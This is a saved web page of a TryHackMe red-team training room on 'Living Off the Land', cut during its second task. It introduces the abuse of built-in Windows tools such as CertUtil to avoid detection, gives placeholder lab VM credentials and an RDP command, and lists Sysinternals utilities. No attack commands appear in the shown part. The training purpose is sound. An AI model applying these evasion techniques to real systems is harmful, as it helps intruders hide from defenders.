<a class="dropdown-item" href="https://tryhackme.com/rooms">My Rooms</a>
<a class="dropdown-item" href="https://tryhackme.com/access">Access</a>
<a class="dropdown-item" href="https://tryhackme.com/feedback">Give Feedback</a>
<a class="dropdown-item" href="https://tryhackme.com/logout">Logout</a>
</div>
</li>
</ul>
</div>
</div>
</nav>
<link rel="stylesheet" href="./TryHackMe _ Living Off the Land_files/streak-freeze.css">
<div class="modal fade modal-streak-freeze" id="unlocked-streak-freeze" role="dialog">
<div class="modal-dialog" role="document">
<div class="modal-content">
<button type="button" class="close close-streak" id="close-streak-freeze-popup" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
<div class="modal-body">
<figure>
<img class="img-streak" width="400px" alt="streak freeze unlocked" src="./TryHackMe _ Living Off the Land_files/streak-freeze.svg">
</figure>
<h2>You've unlocked a streak freeze!</h2>
<p>With these one-time streak freezes, you can miss one day of hacking without losing your streak.</p>
</div>
</div>
</div>
</div>
<script src="./TryHackMe _ Living Off the Land_files/streak-freeze.js"></script>
<nav id="thm-mobile-nav-menu" class="thm-mobile-nav" aria-label="Mobile secondary navigation menu.">
<header>
<a href="https://tryhackme.com/" aria-label="Go to the home page">
<img width="140" src="./TryHackMe _ Living Off the Land_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo">
</a>
<button id="thm-mobile-nav-close" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Close mobile navigation">
<i class="fal fa-times"></i>
</button>
</header>
<ul class="thm-mobile-nav-items mb-0">
<li class="nav-item ">
<a class="nav-link" href="https://tryhackme.com/dashboard">
<i class="nav-title-icon far fa-browser"></i>
<div class="nav-title">Dashboard</div>
</a>
</li>
<li class="nav-item active">
<a class="nav-link" href="https://tryhackme.com/hacktivities">
<i class="nav-title-icon far fa-book-open"></i>
<div class="nav-title">Learn</div>
</a>
</li>
<li class="nav-item ">
<a aria-expanded="false" aria-controls="mobile-nav-compete" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-compete" class="sublinks-toggle nav-link">
<i class="nav-title-icon far fa-trophy"></i>
<div class="nav-title">Compete</div>
<i class="far fa-angle-down"></i>
</a>
<div id="mobile-nav-compete" class="dropdown-wrapper">
<a href="https://tryhackme.com/leaderboards">
<div>
<i class="fas fa-trophy"></i>
</div>
<div>
<span class="mb-0">Leaderboards</span>
<div class="text-lgray size-12">Platform Rankings</div>
</div>
</a>
<a href="https://tryhackme.com/games/koth">
<div>
<i class="fas fa-crown"></i>
</div>
<div>
<span class="mb-0">King of the Hill</span>
<div class="text-lgray size-12">Attack &amp; Defend</div>
</div>
</a>
<a href="https://tryhackme.com/workspace">
<div>
<i class="fas fa-user-friends"></i>
</div>
<div>
<span class="mb-0">Workspace</span>
<div class="text-lgray size-12">Compete &amp; Collaborate</div>
</div>
</a>
</div>
</li>
<li class="nav-item">
<a aria-expanded="false" aria-controls="mobile-nav-other" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-other" class="sublinks-toggle nav-link">
<i class="nav-title-icon far fa-ellipsis-h-alt"></i>
<div class="nav-title">Other</div>
<i class="far fa-angle-down"></i>
</a>
<div id="mobile-nav-other" class="dropdown-wrapper">
<a href="https://tryhackme.com/resources">Resources</a>
<a href="https://tryhackme.com/subscriptions">Buy Vouchers</a>
<a href="https://tryhackme.com/develop-rooms">Develop Rooms</a>
<a href="https://tryhackme.com/business">For Business</a>
<a href="https://tryhackme.com/classrooms">For Education</a>
<a target="_blank" href="https://store.tryhackme.com/">Swag Shop</a>
</div>
</li>
<li class="nav-item text-center">
<div class="nav-item-streak">
<span id="mobile-streak-popover" class="size-24" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;p class=&#39;mb-2&#39;&gt;Complete a question every day to build your hacking streak, earn badges and streak freezes!&lt;/p&gt;

&lt;div class=&#39;size-12 faded&#39;&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;7&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Access to networks, Streak freeze&lt;/p&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;30&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Streak freeze&lt;/p&gt;
  &lt;p class=&#39;m-0&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;45&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = 5% off swag&lt;/p&gt;
&lt;/div&gt;
 &lt;div class=&#39;size-12 text-center faded mt-2 font-italic&#39;&gt;1 
        day streak freeze equipped&lt;/div&gt;" data-original-title="" title="">
<span id="mobile-user-streak" data-streak="7" class="hacker-green">7 <i class="fas fa-fire-alt"></i></span>
</span>
</div>
</li>
<li class="nav-item text-center">
<a class="nav-link size-22 d-inline-block" href="https://tryhackme.com/room/livingofftheland#" id="mobile-notification-btn" role="button" data-toggle="dropdown">
<i id="mobile-notification-icon" class="fal fa-bell"></i>
<div id="mobile-notification-dot"></div>
</a>
<div id="mobile-nav-notification" class="dropdown-menu dropdown-menu-right">
<div id="mobile-notification-header">Notifications</div>
<div id="mobile-nav-notifications">
<div class="text-center mt-2 mb-2"><i>Loading..</i></div>
</div>
</div>
</li>
<li class="nav-item text-center">
<a aria-expanded="false" aria-controls="mobile-nav-auth" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-auth" class="sublinks-toggle nav-link d-inline-block">
<img src="./TryHackMe _ Living Off the Land_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar">
</a>
<div id="mobile-nav-auth" class="dropdown-wrapper">
<a href="https://tryhackme.com/profile">Profile</a>
<a href="https://tryhackme.com/referrals">Refer a friend</a>
<a href="https://tryhackme.com/badges">Badges</a>
<a href="https://tryhackme.com/rooms">My Rooms</a>
<a href="https://tryhackme.com/access">Access</a>
<a href="https://tryhackme.com/feedback">Give Feedback</a>
<a href="https://tryhackme.com/logout">Logout</a>
</div>
</li>
</ul>
</nav>
<script defer="" src="./TryHackMe _ Living Off the Land_files/mobile-nav.js"></script>
<script>
  const userSignedUpLessThanSevenDaysAgo = Math.floor(
    (new Date() - new Date('Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)')) / (1000 * 60 * 60 * 24) < 7
  );

  const userHasFirst4RoomsBadge = !!``;
  const isBeginner = `advanced` === 'complete-beginner';
</script>
<script src="./TryHackMe _ Living Off the Land_files/notifications.js"></script>
<script src="./TryHackMe _ Living Off the Land_files/streak-freeze(1).js"></script>
<div id="wrapper">
<div id="room-banner" class="shadow-light">
<img id="room-image-large" src="./TryHackMe _ Living Off the Land_files/30e28f5794b7cbcb7375159dac41c289.png">
<div>
<div id="room-details">
<div class="container">
<div class="page-header">
<div class="room-header">
<div id="room-voting" class="text-center vertical-align-custom">
<div class="voting-buttons">
<i class="fas fa-thumbs-up display-block" onclick="makeVote(true)" id="vote-up" style="color: rgb(185, 185, 185);"></i>
<div class="display-block" id="vote-number">245</div>
<i class="fas fa-thumbs-down display-block" onclick="makeVote(false)" id="vote-down" style="color: rgb(185, 185, 185);"></i>
</div>
</div>
<div id="room-logo" class="vertical-align-custom">
<div id="logo"><img class="room-avatar" src="./TryHackMe _ Living Off the Land_files/e4c6a1e8fc63869476ab415e674585bb.png" onerror="replaceImg(this)"></div>
</div>
<div class="vertical-align-custom">
<div id="room-basic-data">
<div class="d-flex justify-content-between">
<h1 id="title" class="bold-head">Living Off the Land</h1>
<div id="room-title-options">

<div class="btn-group" id="browser-machine-options" role="group" aria-label="Start AttackBox or Kali Linux" style="display: inline-flex;">
<button id="browser-machine-start" type="button" class="btn btn-secondary"><i class="far fa-laptop"></i> Start AttackBox</button>
<div class="btn-group" id="browser-machines" role="group">
<button id="btnGroupDrop1" type="button" class="btn btn-secondary dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></button>
<div class="dropdown-menu" aria-labelledby="btnGroupDrop1">
<a class="dropdown-item  preventDefault" href="https://tryhackme.com/room/livingofftheland#" onclick="changeMyMachine(&quot;kali-linux&quot;)">
<span class="mb-0">Use Kali Linux</span>
<div class="text-lgray size-12">Web-based Kali Machine</div>
</a>
<a class="dropdown-item preventDefault" href="https://tryhackme.com/room/livingofftheland#" onclick="changeMyMachine(&quot;attackbox&quot;)">
<span class="mb-0">Use AttackBox</span>
<div class="text-lgray size-12">Recommended</div>
</a>
</div>
</div>
</div>
<button id="browser-machine-split-view" type="button" class="btn btn-secondary">Show Split View</button>
<button id="cloud-details" type="button" class="btn btn-info"><i class="far fa-clouds mr-1"></i>Cloud Details</button>
<span id="awards-model-btn" data-toggle="modal" data-target="#award-modal" class="badge badge-warning ml-1 noselect">Awards</span>
<span id="room-faq-slideout" type="button" class="badge badge-info ml-1 noselect d-inline-flex" onclick="openHelpMenu()">
Help
</span>
<div class="dropright room-dropright noselect ml-1" id="room-options" style="display: inline-block;">
<span class="badge badge-secondary" data-toggle="dropdown">
<i class="fas fa-cog"></i>
</span>
<div class="dropdown-menu">
<a class="dropdown-item" href="https://tryhackme.com/api/room/manage/clone/livingofftheland" id="clone-room" style="display: none;"><i class="far fa-clone faded"></i> Clone Room</a>
<a class="dropdown-item preventDefault" id="writeups-simple" style="display: inline-block;"><i class="fas fa-pen-alt faded"></i> Writeups</a>
<a class="dropdown-item preventDefault" data-toggle="modal" data-target="#resetUserProgressModal"><i class="fas fa-eraser faded"></i> Reset Progress</a>
<a class="dropdown-item preventDefault" id="leave-room"><i class="fas fa-sign-out-alt faded"></i> Leave</a>
</div>
</div>
<span id="bookmark" class="badge badge-secondary badge-bookmark ">
<img class="bookmark" src="./TryHackMe _ Living Off the Land_files/bookmark.svg">
<span class="bookmark-popover" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="top" data-content="&lt;p class=&#39;mb-0&#39;&gt;Save room &lt;/p&gt;
" data-original-title="" title="">
</span>
</span>
</div>
</div>
<p class="mb0 faded" id="description">Learn the essential concept of "Living Off the Land" in Red Team engagements.</p>
</div>
</div>
</div>
</div>

</div>
</div>
<div id="room-banner-stats">
<div class="creators"></div>
<div class="numbers"></div>
</div>
</div>
</div>
<div class="container main pb">
<div id="room-message"></div>
<section id="sponsor">
<i id="sponsor-close" class="fas fa-times"></i>
<div id="sponsor-data"></div>
</section>
<div id="top-panel">
<ul class="nav nav-tabs" id="task-navs">
<li class="nav-item">
<a class="nav-link  active " data-toggle="tab" href="https://tryhackme.com/room/livingofftheland#chart">
<i class="fas fa-chart-line icon-right"></i> Chart
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/livingofftheland#scoreboard">
<i class="fas fa-trophy icon-right"></i> Scoreboard
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/livingofftheland#chat">
<i class="fas fa-comments-alt icon-right chat-icon"></i> Discuss
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/livingofftheland#writeups">
<i class="fas fa-pen-alt icon-right"></i> Writeups
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/livingofftheland#about">
<i class="fas fa-info-circle icon-right"></i> More
</a>
</li>
</ul>
<div class="card cd-2 nav-above-con" id="room-main">
<div class="card-body">
<span id="room-tabs">
<div class="tab-content">
<div id="chart" class="tab-pane  active ">
<span id="difficulty-bar">
    <span class="room-difficulty diff-text">
      Difficulty: 
        <span class="difficulty-medium">Medium</span>
    </span></span>
<br><div id="chart-data"></div>
</div>
<div id="scoreboard" class="tab-pane fade">
<table class="table table-striped table-bordered table-condensed table-header-rotated mb-0" id="scoreboard_table">
<thead>
<tr id="scoreboard_header">
<th>Rank</th>
<th>Username</th>
<th>Total Score</th>
</tr>
</thead>
<tbody id="scoreboard_body"></tbody>
</table>
</div>
<div id="chat" class="tab-pane fade">

<div class="row">
<div class="col-sm-6 text-center">
<h3 class="mb-2">Discord</h3>
<p>Come join our <a target="_blank" href="https://discord.gg/QgC6Tdk">Discord</a> server for support or further discussions</p>
</div>
<div class="col-sm-6 text-center">
<h3 class="mb-2">Forum</h3>
<div id="forum-text">Read or post on the dedicated forum <a href="https://tryhackme.com/forum/thread/62558babd30b4c0048343483">post</a></div>
</div>
</div>
</div>
<div id="writeups" class="tab-pane text-center">
<div id="writeups-data">There are no writeups submitted.</div>
<button onclick="showWriteupForm(this)" type="button" class="btn btn-xs btn-secondary mt-3 mb-2">Add Writeup</button>
<div id="writeup-form">
<div class="form-row">
<div class="col-auto">
<input type="text" class="form-control mb-2" id="writeup-title" placeholder="Writeup Title">
</div>
<div class="col-auto">
<input type="text" class="form-control mb-2" id="writeup-link" placeholder="Writeup URL">
</div>
<div class="col-auto">
<button id="submit-writeup" type="submit" class="btn btn-success mb-2">Submit</button>
</div>
</div>
<p class="faded mb-0 size-14"><i class="fas fa-exclamation-triangle text-warning"></i> Writeups should have a link to TryHackMe and not include any passwords/cracked hashes/flags</p>
</div>
</div>
<div id="about" class="tab-pane text-center">
<p id="about-freeRoom"><p class="mb-0">Only subscribers can deploy virtual machines in this room! 
        Go to your <a href="https://tryhackme.com/profile">profile</a> page to subscribe (if you have not already). 5423 users are in here and this room is 460 days old.</p></p>
<p id="about-owner"><p class="size-18">Created by <img class="avatar-tiny" src="./TryHackMe _ Living Off the Land_files/af7feb2c43a2c7d5f111b98ccbd15048.png"> 
        <a class="green-link" href="https://tryhackme.com/p/tryhackme">tryhackme</a></p></p>
</div>
</div>
</span>
</div>
</div>
</div>
<div id="room-simple-video" class="card card-body cd-2"></div>
<div class="card mt-3 mb-3 cd-2 text-center" id="instance-info">
<div class="card-header card-header-red">Active Machine Information</div>
<div class="card-body">
<div class="row vertical-align-custom">
<div class="col-sm-3">
<i>Loading...</i>
</div>
<div class="col-sm-3" id="table-machine-ip">
<i>Loading...</i>
</div>
<div class="col-sm-3">
<i>Loading...</i>
</div>
<div class="col-sm-3">
<i>Loading...</i>
</div>
</div>
</div>
</div>
<div id="task-list">
<div id="room-task-detail" class="mb-3"><span id="progress-bar" style="display: block;"><div class="progress"><div class="progress-bar bg-success" role="progressbar" style="width: 100%; aria-valuemin=" 0"="" aria-valuemax="100"> 100%</div></div></span></div>
<div id="taskContent"><div class="card" id="task-1">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse1">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 1                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Introduction
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"><i class="far fa-server text-lgreen" data-toggle="tooltip" data-placement="left" title="" data-original-title="Task includes a deployable machine"></i></span>
                        </a>
                    </div>
                    <div id="collapse1" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"><div class="btn-group mb-3 ml-3 float-right">
            <button type="button" class="btn btn-success" value="62d10fa6cf5f4143cc1532a7" onclick="deploy(this)"><i class="fas fa-play mr-2"></i> Start Machine</button>
        </div> <p><span style="font-size:24px">What is "Living Off the Land"?</span></p><p><span style="font-weight:bolder">Living Off the Land</span>&nbsp;is a trending term in the red team community. The name is taken from real-life, living by eating the available food on the land.&nbsp;Similarly, adversaries and malware creators take advantage of a target computer's built-in tools and utilities. The term&nbsp;<span style="font-weight:bolder">Living Off the Land</span>&nbsp;was introduced at&nbsp;<a href="https://www.youtube.com/watch?v=j-r6UonEkUw" target="_blank">DerbyCon3</a>&nbsp;in 2013 and has gained more traction in the red team community ever since, becoming an often used and popular technique.</p><p style="text-align:center"></p>

<p style="text-align:center"><img src="./TryHackMe _ Living Off the Land_files/49a75447ada0085412a5f56818b54cb2.png" alt=" " style="width:473.5px;height:268.743px"><b><br></b></p><p><span style="font-size:1rem">These built-in tools perform various regular activities within the target system or network capabilities; however, they are increasingly used and abused, for example, using the </span><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil" target="_blank">CertUtil </a><span style="font-size:1rem">tool to download malicious files into the target machine.</span><br></p><p>The primary idea is to use Microsoft-signed programs, scripts, and libraries to blend in and evade defensive controls. Red teamers do not want to get detected when executing their engagement activities on the target, so utilizing these tools is safer to maintain their stealth.</p><p>The following are some categories that Living Off the Land encompasses:</p><p></p><ul style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"><li style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">Reconnaissance</span></li><li style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">Files operations</span></li><li style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">Arbitrary&nbsp;code execution</span></li><li style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">Lateral movement</span></li><li style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">Security product bypass</span></li></ul><p></p><p><span style="font-size:24px">Learning objectives</span></p><ul><li style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">Learn about the term&nbsp;<b>Living Off the Land</b>&nbsp;of red team engagements.</span></li><li style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc">Learn about the LOLBAS project and how to use it.</li><li style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">Understand and apply the techniques used in red teaming engagements.</span></li></ul><p></p><p><span style="font-size:24px">Room prerequisites</span></p><ul><li style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc">&nbsp;<span style="background:transparent;margin-top:0pt;margin-bottom:0pt"><span style="background-color:transparent;font-size:1rem">Basic knowledge of general hacking techniques.</span></span></li><li style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt"><span style="background-color:transparent;font-size:1rem">&nbsp;</span></span>Completing the <a href="https://tryhackme.com/path-action/jrpenetrationtester/join" target="_blank">Jr. Penetration Tester</a> Learning Path.</li><li style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc">&nbsp;TryHackMe <a href="https://tryhackme.com/module/red-team-initial-access" target="_blank">Red Team&nbsp;Initial Access module</a><span style="background-color:transparent;font-size:1rem">.</span></li></ul><p>We have provided a Windows machine 10 Pro to complete this room. You can use the in-browser feature, or&nbsp;<span style="font-size:1rem"><span>If you prefer to connect via <a class="KMuHLY7u glossary-term" onclick="initPopOver(&#39;RDP&#39;, &#39;KMuHLY7u&#39;)">RDP</a>, make sure you deploy the AttackBox or connect</span></span><u>&nbsp;to the VPN</u><span style="font-size:1rem">.</span></p><p><span style="font-size:1rem">Use the following credentials below.</span></p><p style="text-align:center">Machine IP:&nbsp;<span class="notion-enable-hover" style="text-align:left;font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">MACHINE_IP</span><span style="font-size:1rem;text-align:left">&nbsp;</span><span style="font-size:1rem">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Username:&nbsp;</span><span class="notion-enable-hover" style="text-align:left;font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">thm</span><span style="font-size:1rem;text-align:left">&nbsp;</span><span style="font-size:1rem">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="font-size:1rem">Password:&nbsp;</span><span class="notion-enable-hover" style="text-align:left;font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">TryHackM3</span><span style="font-size:1rem;text-align:left">&nbsp;</span></p>
<div class="terminal-container">
	<div class="terminal-content">
		<div class="terminal-top"><span>Connect to the <a class="53Gv28y5 glossary-term" onclick="initPopOver(&#39;VM&#39;, &#39;53Gv28y5&#39;)">VM</a> via RDP client</span></div>
		<pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
			<code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@machine</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">xfreerdp /v:MACHINE_IP /u:thm /p:TryHackM3</span></span></code>
	    </pre></div></div></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Deploy the provided machine and move on to the next task.
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="1">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-2">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse2">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 2                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Windows Sysinternals
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse2" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p style="text-align:left"><span style="font-size:24px">﻿</span><span style="font-size:24px">What is Windows Sysinternals?</span><img src="./TryHackMe _ Living Off the Land_files/2f03b08c289de324bf0aaf3ae1271ccd.png" style="float:right;width:289.513px;height:292.297px" class="note-float-right" alt=" "></p><p style="text-align:left"></p><p style="text-align:center"></p><p style="text-align:center"><span style="font-weight:bolder"></span></p><div>Windows Sysinternals is a set of tools and advanced system utilities developed to help IT professionals manage, troubleshoot, and diagnose the Windows operating system in various advanced topics.&nbsp;<br></div><p></p><p><span style="background-color:transparent;color:rgb(14, 16, 26);font-size:1rem">Sysinternals Suite is divided into various categories, including:</span><br></p><ul><li style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">Disk management</span></li><li style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">Process management </span></li><li style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">Networking tools </span></li><li style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">System information</span></li><li style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">Security tools</span></li></ul><p style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt">In order to use the Windows Sysinternals tools, we need to accept the Microsoft license agreement of these tools. We can do this by passing the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">-accepteula</span><span style="color:rgb(33, 37, 41);font-size:1rem">&nbsp;</span><span style="background-color:transparent;font-size:1rem">argument at the command prompt or by GUI during tool execution.</span></p><p style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"></p><ul style="box-sizing:border-box;margin-top:0px;margin-bottom:1rem;color:rgb(33, 37, 41);font-family:Ubuntu, monospace;font-size:16px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:400;letter-spacing:normal;orphans:2;text-align:left;text-indent:0px;text-transform:none;white-space:normal;widows:2;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-thickness:initial;text-decoration-style:initial;text-decoration-color:initial"></ul><p></p><p style="box-sizing:border-box;margin-top:0px;margin-bottom:1rem;color:rgb(33, 37, 41);font-family:Ubuntu, monospace;font-size:16px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:400;letter-spacing:normal;orphans:2;text-align:left;text-indent:0px;text-transform:none;white-space:normal;widows:2;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-thickness:initial;text-decoration-style:initial;text-decoration-color:initial"><span style="color:rgb(14, 16, 26);font-size:1rem">The following are some popular Windows Sysinternals tools:</span></p><table class="table table-bordered" style="text-align:center;width:856px"><tbody><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk" target="_blank">AccessChk</a><br></td><td><span style="text-align:left">Helps system administrators check specified access<span style="font-size:1rem">&nbsp;for&nbsp;</span></span><span style="text-align:left">files, directories, Registry keys, global objects, and Windows services</span><span style="text-align:left">.</span><br></td></tr><tr><td><span style="text-align:left"><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec" target="_blank">PsExec</a></span><br></td><td><span style="text-align:left">A tool that executes programs on a remote system</span><span style="text-align:left">.</span><br></td></tr><tr><td><span style="text-align:left"><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer" target="_blank">ADExplorer</a></span><br></td><td><span style="text-align:left"><span>An advanced Active Directory tool that helps to easily view and manage the <a class="caRWLwBm glossary-term" onclick="initPopOver(&#39;AD&#39;, &#39;caRWLwBm&#39;)">AD</a> database.</span></span><br></td></tr><tr><td><span style="text-align:left"><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" target="_blank">ProcDump</a></span><br></td><td>Monitors running processes for CPU spikes and the ability to dump memory for further analysis.<br></td></tr><tr><td><span style="text-align:left"><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon" target="_blank">ProcMon</a></span><br></td><td><span style="text-align:left">An essential tool for process monitoring</span><span style="text-align:left">.</span></td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview" target="_blank">TCPView</a></td><td style="text-align:center"><span>A tool that lists all <a class="FdeuAufH glossary-term" onclick="initPopOver(&#39;TCP&#39;, &#39;FdeuAufH&#39;)">TCP</a> and UDP connections.</span></td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pstools" target="_blank">PsTools</a></td><td style="text-align:center">The first tool designed in the Sysinternals suite to help list detailed information.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/portmon" target="_blank">Portmon</a></td><td>Monitors and displays all serial and parallel port activity on a system.<br></td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/whois" target="_blank">Whois</a></td><td>Provides information for a specified domain name or IP address.</td></tr></tbody></table><p style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt">For more information about the Sysinternals suite, you can visit the tools' web page on Microsoft Docs&nbsp;<a target="_blank" href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" class="editor-rtfLink">here</a><span style="background:transparent;font-size:1rem;margin-top:0pt;margin-bottom:0pt">.</span></p><p style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt"><br></span></p><p><span style="font-size:24px">Sysinternals Live</span></p><p style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">One of the great features of Windows Sysinternals is that there is no installation&nbsp;</span><span style="font-size:1rem">required</span><span style="background-color:transparent;font-size:1rem">. Microsoft provides a Windows Sysinternals service, Sysinternals live, with various ways to use and execute the tools. We can access and use them through:</span></p><ul><li style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">Web browser (</span><a target="_blank" href="https://live.sysinternals.com/" class="editor-rtfLink">link</a><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">).</span></li><li style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">Windows Share</span></li><li style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">Command prompt</span></li></ul><p style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="font-size:1rem">In order to use these tools, you either download them or by entering the Sysinternal Live path&nbsp;</span><span class="notion-enable-hover" 